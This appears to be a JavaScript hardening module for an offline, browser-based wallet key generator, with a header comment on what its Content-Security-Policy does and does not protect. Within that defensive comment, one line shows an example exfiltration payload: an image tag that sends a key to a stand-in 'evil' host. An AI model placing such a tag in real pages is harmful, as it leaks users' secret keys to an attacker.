/**
 * security.js — runtime hardening, and an honest account of its limits.
 *
 * ## What actually protects a secret in this page
 *
 * The Content-Security-Policy in index.html is the load-bearing part, and the
 * single most important line in it is:
 *
 *     connect-src 'none'
 *
 * That tells the browser to refuse every fetch(), XMLHttpRequest, WebSocket,
 * EventSource and sendBeacon this page attempts — not to warn, to refuse. The
 * point is that it holds *even if this JavaScript is malicious*. If someone
 * compromised the repo tomorrow and replaced app.js with a key-stealer, the
 * stealer would still have nowhere to send the keys. img-src, style-src,
 * font-src and form-action are locked down for the same reason: each is an
 * exfiltration channel if you leave it open. An <img src="https://evil/?key=…">
 * leaks just as well as a fetch.
 *
 * ## What it does NOT protect against — stated plainly
 *
 *  - Browser extensions. Content scripts run in an isolated world with their
 *    own privileges. They can read this page's DOM and make their own network
 *    requests, and the page's CSP does not apply to them. No amount of
 *    JavaScript here changes that. This is why the tool tells you to use a
 *    clean profile or go offline, rather than claiming to be "100% secure".
 *  - Anything on a compromised operating system: keyloggers, clipboard
 *    scrapers, screen capture.
 *  - Navigation-based exfiltration (assigning location.href). CSP's navigate-to
 *    directive was removed from the spec, so this is not blockable — though it
 *    is at least visible, since your page would disappear.
 *  - A tampered index.html. The CSP names the sha256 of this page's own
 *    script, so the browser refuses a modified one — but whoever can rewrite
 *    the script can rewrite the hash beside it. That is tamper-evidence
 *    against a partial compromise, not proof of honesty. Only comparing the
 *    published SHA-256 of the whole file against what you downloaded gives you
 *    that, and only because it is published somewhere else.
 *
 * The checks below therefore report facts. They are not a security guarantee,
 * and a page that has already been compromised could lie about every one of
 * them. They exist to catch accidents and to make the environment legible.
 */

/**
 * Freeze the prototypes an attacker would otherwise use for prototype
 * pollution, and snapshot the natives we rely on before any other code runs.
 * Must be called first, before the crypto bundle is touched.
 */
export function harden() {
  const natives = {
    getRandomValues: globalThis.crypto?.getRandomValues?.bind(globalThis.crypto),
    now: performance.now.bind(performance),
  };

  // A frozen Object.prototype makes `__proto__` tricks and accidental global
  // shims fail loudly instead of silently changing behaviour underneath us.
  for (const target of [
    Object.prototype,
    Array.prototype,
    Function.prototype,
    String.prototype,
    Number.prototype,
    Uint8Array.prototype,
    Object.getPrototypeOf(Uint8Array), // TypedArray
  ]) {
    try {
      Object.freeze(target);
    } catch {
      /* older engines may refuse; not fatal */
    }
  }

  return natives;
}

/**
 * Prove the CSPRNG is present and behaving before we let anyone generate a
 * key with it. A stuck or absent RNG is the failure mode that silently
 * produces worthless wallets, so refuse to run rather than guess.
 */
export function assertUsableRandomness() {
  const c = globalThis.crypto;
  if (!c || typeof c.getRandomValues !== 'function') {
    return { ok: false, reason: 'missing' };
  }
  // A non-native getRandomValues means something has replaced it. That is not
  // proof of malice — some polyfills do it — but it is worth surfacing.
  const native = /\[native code\]/.test(Function.prototype.toString.call(c.getRandomValues));

  const a = c.getRandomValues(new Uint8Array(32));
  const b = c.getRandomValues(new Uint8Array(32));
  const allZero = a.every((x) => x === 0);
  const identical = a.every((x, i) => x === b[i]);
  if (allZero || identical) return { ok: false, reason: 'not-random', native };

  return { ok: true, native };
}

/** Facts about where this page is running. */
export function auditEnvironment() {
  const checks = [];
  const add = (id, level, value) => checks.push({ id, level, value });

  const protocol = location.protocol;
  if (protocol === 'file:') add('transport', 'good', 'file://');
  else if (protocol === 'https:') add('transport', 'ok', 'https');
  else add('transport', 'bad', protocol.replace(':', ''));

  const framed = (() => {
    try {
      return globalThis.top !== globalThis.self;
    } catch {
      return true; // cross-origin parent throws — that itself means framed
    }
  })();
  add('framed', framed ? 'bad' : 'good', framed ? 'yes' : 'no');

  const online = navigator.onLine !== false;
  add('network', online ? 'warn' : 'good', online ? 'online' : 'offline');

  const cspTag = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
  const connectBlocked = /connect-src\s+'none'/.test(cspTag?.content ?? '');
  add('csp', connectBlocked ? 'good' : 'bad', connectBlocked ? 'connect-src none' : 'absent');

  const rng = assertUsableRandomness();
  add('rng', rng.ok && rng.native ? 'good' : rng.ok ? 'warn' : 'bad',
      rng.ok ? (rng.native ? 'native csprng' : 'replaced') : 'unusable');

  add('workers', typeof Worker === 'function' ? 'good' : 'warn',
      typeof Worker === 'function' ? String(navigator.hardwareConcurrency || 1) + ' cores' : 'none');

  return { checks, rng, framed, online, connectBlocked };
}

/**
 * Best-effort overwrite of a byte buffer.
 *
 * Be clear-eyed about this: JavaScript gives no guarantee that the bytes are
 * gone. The engine may have copied the buffer during a GC compaction, the OS
 * may have paged it to disk, and strings are immutable so anything that ever
 * became a string cannot be wiped at all. Zeroing a Uint8Array closes the
 * easiest window; it does not close the room.
 */
export function wipe(bytes) {
  if (bytes instanceof Uint8Array) {
    crypto.getRandomValues(bytes); // overwrite, then zero
    bytes.fill(0);
  }
}

/**
 * Copy to clipboard and schedule a self-clear.
 *
 * The clipboard is shared with every application on the machine and every
 * other browser tab that asks for paste permission. Auto-clearing shortens the
 * window; it does not eliminate it, and any clipboard manager will have kept
 * a copy regardless.
 */
export async function copyEphemeral(text, { clearAfterMs = 45000 } = {}) {
  await navigator.clipboard.writeText(text);
  if (!clearAfterMs) return () => {};
  const timer = setTimeout(async () => {
    try {
      const current = await navigator.clipboard.readText();
      if (current === text) await navigator.clipboard.writeText('');
    } catch {
      // Reading the clipboard needs permission that we may not have. Nothing
      // to do; the caller was told this is best-effort.
    }
  }, clearAfterMs);
  return () => clearTimeout(timer);
}

/**
 * Refuse to persist secrets, loudly.
 *
 * The tool never writes to storage. This makes that a property of the code
 * rather than a promise in a README: if a future edit tries to stash a
 * mnemonic in localStorage, it throws in development instead of shipping.
 */
export function sealStorage() {
  const deny = (name) => {
    try {
      Object.defineProperty(globalThis, name, {
        configurable: false,
        get() {
          throw new Error(
            `${name} is disabled: this tool must never persist key material.`,
          );
        },
      });
    } catch {
      /* some browsers refuse to redefine; the CSP and code review still stand */
    }
  };
  for (const name of ['localStorage', 'sessionStorage']) deny(name);
}
